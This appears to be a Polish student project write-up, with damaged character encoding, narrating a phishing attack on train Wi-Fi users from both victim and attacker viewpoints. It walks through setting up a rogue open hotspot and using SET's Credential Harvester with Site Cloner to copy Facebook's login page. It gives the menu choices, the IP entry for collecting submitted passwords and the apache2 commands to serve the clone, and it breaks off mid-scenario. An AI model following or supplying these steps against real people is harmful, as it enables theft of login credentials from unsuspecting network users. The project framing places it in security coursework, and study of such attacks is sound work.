#[WDKKP] Projekt - HarvesterJob
# __author__ = 'Micha� Bogdanowicz'

wersja1 - napastnik ma dost�p do internetu
wersja2 - napastnik nie ma dost�pu do internetu

########WERSJA 1 i 2 - Ofiara

Na potrzeby wyobra�enia sobie skali zagro�enia jakie nios� za sob� strony phishing'owe przyjmijmy, �e w�a�nie wsiadamy do naszego ulubionego poci�gu, niech to b�dzi� stare dobre InterCity, by wyruszy� w d�ug�, �mudn� podr� w kierunku rodzinnego domu w jedyny wolny weekend w tym semestrze.. Wszystko by�o by do prze�ycia gdyby nie to, �e po chwili od startu gubimy zasi�g, a nieod�wie�ona playLista dawno nam si� przejad�a.  

"...mo�e jest tu Wi-Fi albo kto� ma jaki� niezabezpieczony HotSpot, ja, Student informatyki kontra WEP? Co to dla mnie..." 

########WERSJA 1 - Ofiara

61-02-ED-6C-21-C6 --- IterCity Wi-Fi Free --- unsecured
D7-69-EB-D7-2A-EC --- Manager Biedronki --- WPA-AES
83-02-2F-5B-19-46 --- Xperia-Z3 --- unsecured

"Czy�by los si� do mnie u�miechn��?" :)

facebook, twitter, usos, email, wszystko, dos�ownie wszystko chodzi�o pi�knie (wiadomo czasem by�y przerwy, ale by�o darmo wi�c nie ma co narzeka�). 

########WERSJA 2 - Ofiara

61-02-ED-6C-21-C6 --- IterCity OnlyFacebook* --- unsecured
D7-69-EB-D7-2A-EC --- Manager Biedronki --- WPA-AES
83-02-2F-5B-19-46 --- Xperia-Z3 --- WPA-AES

*lub jakikolwiek inny znany portal, do ktorego ludzie ch�tnie zajrz�, kt�ry oczywi�cie wi��e ze sob� konieczno�� logowania.

"Nie jest tak �le, chocia� fejsa przejrz�.." :)

"wpisa�em has�o, co� nie dzia�a, mo�e jeszcze raz.. to pkp si� nied�ugo rozleci" - ostentacyjnie zak�adam s�uchawki.

########UWAGA - Ofiara

Mog� pojawi� si� ostrze�enia, �e sie� nie jest bezpieczna, ale w ko�cu jest publiczna, wi�c wiekszo�� si� tym zbytnio nie przejmie. Bystre oko zaktualizowanej przegl�darki r�wnie� mo�e doszuka� si� problemu w w�asnorecznie podpisanym certyfikacie i pod�wietli� go na "��to", po najechaniu jednak na ten button wida�, �e wystawiono go dla facebook'a.

########WERSJA 1 i 2 - Napastnik

Jak mi�o patrze� jak ludzie mkn� przed siebie, otoczeni technologi�, maj�c �wiat na wyci�gniecie r�ki, z�udne poczucie bezpiecze�stwa i blisko�ci innych zasypuj�c si� danymi, cz�sto pozbawiaj�c si� resztek prywatno�ci. Dopijam kaw� i wsiadam zaj�� jakie� wygodne miejsce w najbardziej opustosza�ym przedziale, tak by nikt mi nie zagl�da� w komputer. A jednak ludzka ciekawo��, dziadzia siedz�cy obok i tak pewnie nic nie zrozumie ale lepiej nie kusi� losu, dobrze, �e kupi�em dzi� ten filtr prywatyzuj�cy, popatrzy si� co najwy�ej w szary mat. Wyciagam laptop, zanim jednak plecak wrzuc� na p�k�, nie wyci�gaj�c z niego odpalam bezprzewodowy router o do�� du�ym zasi�gu pod�aczony pod powerbanka. Cudo. 

Musz� w ko�cu porozsy�a� ten spam z SuperXXX16hot, gdzie na moich go�ci czeka r�wnie wyrafinowany exploit wprost z Metasploit OpenSource(prglng.Ruby). A mo�e znowu kto� si� z�apie na �ledzenie swojego znajomego przez subskrybcj� na DOtPayu. Czy Ci ludzie naprawd� �ykaj� wszystko? 

No dobrze, zobaczmy jak bardzo otaczaj�cy mnie ludzie s� mobilni.. Za�o�e si�, �e kto� na pewno wejdzie na facebook, dobre miejsce na rozes�anie spamu.
Teraz mog� albo uruchomi� przegl�dark�, wpisa�:

https://facebook.com/login.php

Prawy przycisk -> zapisz stron� i wrzuci� to w: /var/www/

Ale chwila, raz �e mo�e nie skopiowa� si� ca�a zawarto��, dwa jest 21 wiek, mam od tego narz�dzia do socjotechnicznych pentest�w. Czarny t�o terminala zdobi ekran Debiana:

root@kali:~# setoolkit 			#wymagany jest root komenda: su / sudo
set> 1					# 1) Social-Engineering Attacks
set> 2					# 2) Website Attack Vectors
set> 3					# 3) Credential Harvester Attack Method

Mo�emy skorzysta� z gotowych templates ale nie musz� one by� zgodne z aktualnymi, u�yjmy zawart� w tym zbiorze Clonera:

set:webattack>2				# 2) Site Cloner

Nast�pnie musimy poda� swoje ip, lub ip serwera kt�ry odbierze dane wys�ane przez ofiar�. Odpalny drugi terminal:

root@kali:~# ifconfig 			#eth0 lub wlan0 i tam inet

Wracamy do pierwszego:

set:webattack>127.0.0.1 		#ip z drugiego terminala
set:webattack>https://www.facebook.com 	#tutaj wpisujemy host panelu logowania wybranej strony

Wystarczy chwil� poczeka�, a nasza strona ju� jest dost�pna w naszej sieci dzi�ki oprogramowaniu apache2.
Gdy jednak poszli�my manualn� drog� kopiujemy stron� do /var/www, odpalamy terminal :

root@kali:~# apt-get install apache2
root@kali:~# /etc/init.d/apache2 start

Problemem jest tylko to, �e "mojego" facebooka zobacz� tylko ludzie znaj�cy IP mojego komputera...


......
		



